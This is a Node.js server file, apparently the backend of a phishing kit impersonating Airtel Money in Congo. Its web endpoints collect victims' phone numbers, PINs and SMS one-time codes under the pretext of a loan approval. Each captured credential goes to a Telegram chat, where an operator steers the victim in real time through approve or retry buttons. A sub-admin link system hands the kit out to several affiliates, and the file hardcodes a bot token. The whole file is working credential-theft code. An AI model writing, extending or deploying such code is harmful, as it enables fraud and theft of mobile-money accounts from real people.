/**
 * AIRTEL MONEY - STRICTLY MAPPED PRIVATE SUB-ADMIN SERVER
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const MAIN_ADMIN_ID = String(process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400').trim();

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [String(id), {
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || ''
      }]));
    }
  } catch (err) {
    console.error('Failed to load admins:', err.message);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('Failed to save admins:', err.message);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

const CALLBACK_ACTIONS = [
  'DENY_CREDS',
  'WRONG_PIN',
  'ALLOW_CREDS',
  'EXPIRED_OTP',
  'APPROVED_FINAL'
];

function parseCallbackData(data = '') {
  for (const action of CALLBACK_ACTIONS) {
    const prefix = `${action}_`;
    if (data.startsWith(prefix)) {
      return {
        actionType: action,
        targetId: data.slice(prefix.length)
      };
    }
  }
  return { actionType: '', targetId: '' };
}

/**
 * Resolves destination chat ID independently without leaking sub-admin traffic
 * to MAIN_ADMIN_ID or defaulting unmapped requests to MAIN_ADMIN_ID.
 *
 * Returns:
 * - MAIN_ADMIN_ID only when explicitly requested for MAIN_ADMIN_ID
 * - subAdminId when it is a registered non-main admin
 * - null when missing, invalid, or unregistered
 */
function resolveTargetChat(adminParam) {
  if (!adminParam || typeof adminParam !== 'string' && typeof adminParam !== 'number') {
    return null;
  }

  const candidateId = String(adminParam).trim();
  if (!candidateId) {
    return null;
  }

  if (candidateId === MAIN_ADMIN_ID) {
    return MAIN_ADMIN_ID;
  }

  if (admins.has(candidateId)) {
    return candidateId;
  }

  return null;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try {
        chatInfo = await bot.getChat(chatId);
      } catch (e) {}

      const username = chatInfo.username || msg.from?.username || 'N/A';
      const firstName = chatInfo.first_name || msg.from?.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from?.last_name || '';

      if (!admins.has(chatId)) {
        admins.set(chatId, { username, firstName, lastName, startedAt: new Date().toISOString() });
        saveAdmins();
      }

      const userLink = `${APP_URL}/?admin=${encodeURIComponent(chatId)}`;
      const isMainAdmin = chatId === MAIN_ADMIN_ID;

      if (isMainAdmin) {
        const mainAdminMessage =
          `👑 *Bienvenue Administrateur Principal*\n\n` +
          `👤 *Info Telegram:*\n` +
          `• Nom: ${firstName}\n` +
          `• Chat ID: \`${chatId}\`\n\n` +
          `🔗 *Votre lien personnel exclusif:*\n${userLink}`;
        await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
        return;
      }

      const subAdminMessage =
        `🤖 *Espace Sous-Administrateur Privé*\n\n` +
        `👤 *Info Telegram:*\n` +
        `• Nom: ${firstName}\n` +
        `• Chat ID: \`${chatId}\`\n\n` +
        `🔗 *Votre lien personnel exclusif:*\n${userLink}`;

      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error('/start error:', err.message);
    }
  });

  bot.on('callback_query', async (query) => {
    try {
      if (!query.message) return;

      const clickerChatId = String(query.message.chat.id);
      const { actionType, targetId } = parseCallbackData(query.data || '');
      const session = sessions.get(targetId);

      // Only send status updates to the session's assigned owner (never MAIN_ADMIN_ID for sub-admin sessions)
      const chatTarget = session?.adminChatId || null;

      if (!chatTarget || chatTarget !== clickerChatId) {
        await bot.answerCallbackQuery(query.id, { text: 'Session introuvable ou non autorisée.' }).catch(() => {});
        return;
      }

      switch (actionType) {
        case 'DENY_CREDS':
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          session.pin = '';
          await bot.sendMessage(chatTarget, '❌ Code PIN rejeté. Le client est redirigé pour recharger son PIN.');
          break;
        case 'ALLOW_CREDS':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, '✅ Connexion autorisée (ALLOW). Le client passe au code OTP SMS (4 chiffres).');
          break;
        case 'EXPIRED_OTP':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, '⚠️ Code OTP expiré. Le client est invité à ressaisir un nouveau code OTP.');
          break;
        case 'APPROVED_FINAL':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, "🎉 Prêt approuvé avec succès! L'écran de confirmation s'est affiché.");
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: 'Action effectuée' }).catch(() => {});
      if (query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id
        }).catch(() => {});
      }
    } catch (err) {
      console.error('callback_query error:', err.message);
    }
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Step 1: Submit Phone Number & PIN -> Delivered strictly to resolved admin's chat ID
app.post('/api/submit-credentials', async (req, res) => {
  try {
    let { phone, pin, adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const airtelCongoRegex = /^09[6789]\d{7}$/;
    if (!airtelCongoRegex.test(phone)) {
      return res.status(400).json({
        success: false,
        error: 'Numéro Airtel Congo non autorisé (doit commencer par 096, 097, 098 ou 099).'
      });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(403).json({
        success: false,
        error: 'Lien administrateur invalide ou non enregistré.'
      });
    }

    const userId = `user_${Date.now()}`;
    sessions.set(userId, {
      phone,
      pin,
      adminChatId: targetChat,
      status: 'WAITING_CREDS_APPROVAL'
    });

    const message =
      `🔴 *AIRTEL MONEY - NUMÉRO ET CODE PIN*\n\n` +
      `📞 *Téléphone:* \`${phone}\`\n` +
      `🔒 *Code PIN:* \`${pin}\`\n\n` +
      `📋 *Format à copier:*\n\`${phone}:${pin}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ DENY', callback_data: `DENY_CREDS_${userId}` },
            { text: '✅ ALLOW', callback_data: `ALLOW_CREDS_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Erreur réseau.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

// Step 2: Submit 4-digit SMS OTP -> Delivered strictly to the session's assigned chat ID
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });

    const targetChat = resolveTargetChat(session.adminChatId);
    if (!targetChat) {
      return res.status(403).json({ success: false, error: 'Destinataire invalide.' });
    }

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const applicantPhone = session.phone || 'Inconnu';

    const message =
      `🔴 *AIRTEL MONEY - OTP SMS (4 Chiffres)*\n\n` +
      `📞 *Demandeur:* \`${applicantPhone}\`\n` +
      `📱 *Code OTP:* \`${otp}\`\n\n` +
      `📋 *Format à copier:*\n\`${applicantPhone}:${otp}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Erreur' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
    
